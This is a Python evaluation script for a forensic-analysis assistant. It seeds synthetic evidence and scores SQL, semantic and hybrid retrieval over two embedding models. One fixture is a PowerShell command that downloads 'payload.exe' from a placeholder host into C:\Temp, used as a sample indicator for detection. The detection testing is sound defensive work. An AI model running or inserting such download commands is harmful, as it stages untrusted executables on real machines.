"""Explicit real-model evaluation, excluded from normal pytest discovery.

Run: python tests/v3_evaluation.py --work <outside-repo-directory> --models <model-root>
All evidence is generated from synthetic fixtures. No MiniCPM or network needed.
"""
import argparse
import json
from pathlib import Path
import sys
import time
sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
from forensic_assistant.artifacts.ingest import ingest_artifact
from forensic_assistant.semantic.model import LocalModel
from forensic_assistant.semantic.index import build,search
from forensic_assistant.semantic.hybrid import retrieve
from forensic_assistant.retrieval.queries import Queries
from forensic_assistant.retrieval.v1_planner import retrieve_question
from v1_fixtures import database,process,add
from v2_fixtures import registry_file,mft_file,prefetch_file

def run(work,models):
    work.mkdir(parents=True,exist_ok=True);db=database()
    expected=[]
    expected.append({process(db,1,'100',data={'CommandLine':'powershell Invoke-WebRequest https://example.invalid/payload.exe -OutFile C:\\Temp\\payload.exe'})['id']})
    for kind,maker in [('registry',registry_file),('mft',mft_file),('prefetch',prefetch_file)]:
        result=ingest_artifact(db,maker(work/kind),kind,hostname='PC.example')
        assert result['status']=='complete',result
    expected.append({r[0] for r in db.execute("SELECT DISTINCT evidence_id FROM registry_views WHERE category='persistence'")})
    expected.append({add(db,2,4625,data={'TargetUserName':'synthetic','Status':'0xc000006d'})['id']})
    expected.append({process(db,3,'200','50',name='cmd.exe',parent='WINWORD.EXE')['id']})
    expected.append({process(db,4,'300',name='C:\\Users\\synthetic\\Downloads\\newtool.exe')['id']})
    expected.append({process(db,5,'400',name='winrs.exe',data={'CommandLine':'winrs -r:LAB-SYNTHETIC hostname'})['id']})
    for i in range(6,46):process(db,i,str(1000+i),name='notepad.exe',data={'CommandLine':'notepad C:\\Synthetic\\notes.txt'})
    questions=['PowerShell downloading an executable','Find Registry persistence','failed logons','Office launching a command interpreter','new executable in a user directory','remote administration']
    report={}
    for modelname in ('bge-small-en-v1.5','all-MiniLM-L6-v2'):
        model=LocalModel(models/modelname);root=work/modelname
        built=build(db,root,model,rebuild=True)
        cases=[]
        for question,relevant in zip(questions,expected):
            t=time.perf_counter();result=search(db,root,model,question,limit=10)
            semantic=[r['evidence_id'] for r in result['results']]
            try:_,c=retrieve_question(Queries(db),question);sql=[r['id'] for r in c['evidence_records']]
            except ValueError:sql=[]
            _,c=retrieve(Queries(db),question,index_root=root,model=model)
            hybrid=list(dict.fromkeys(c['priorities']['anchors']+c['priorities'].get('semantic',[])+[e['id'] for e in c['evidence_records']]))
            metrics={}
            for name,ids in [('sql',sql),('semantic',semantic),('hybrid',hybrid)]:
                selected=set(ids[:10]);hit=len(selected&relevant)
                metrics[name]={'recall_at_10':hit/len(relevant),'precision_at_10':hit/10,'artifact_diversity':len({eid.split(':')[0] for eid in selected}),'duplicate_ids':len(ids[:10])-len(selected)}
            cases.append({'query':question,'metrics':metrics,'semantic_ids':semantic,'seconds':time.perf_counter()-t})
        report[modelname]={'build':built,'cases':cases,'mean_semantic_recall_at_10':sum(c['metrics']['semantic']['recall_at_10'] for c in cases)/6}
    (work/'evaluation.json').write_text(json.dumps(report,indent=2))
    print(json.dumps({k:{'mean_semantic_recall_at_10':v['mean_semantic_recall_at_10'],'cases':[c['metrics'] for c in v['cases']]} for k,v in report.items()},indent=2))

if __name__=='__main__':
    p=argparse.ArgumentParser();p.add_argument('--work',type=Path,required=True);p.add_argument('--models',type=Path,required=True);a=p.parse_args();run(a.work,a.models)
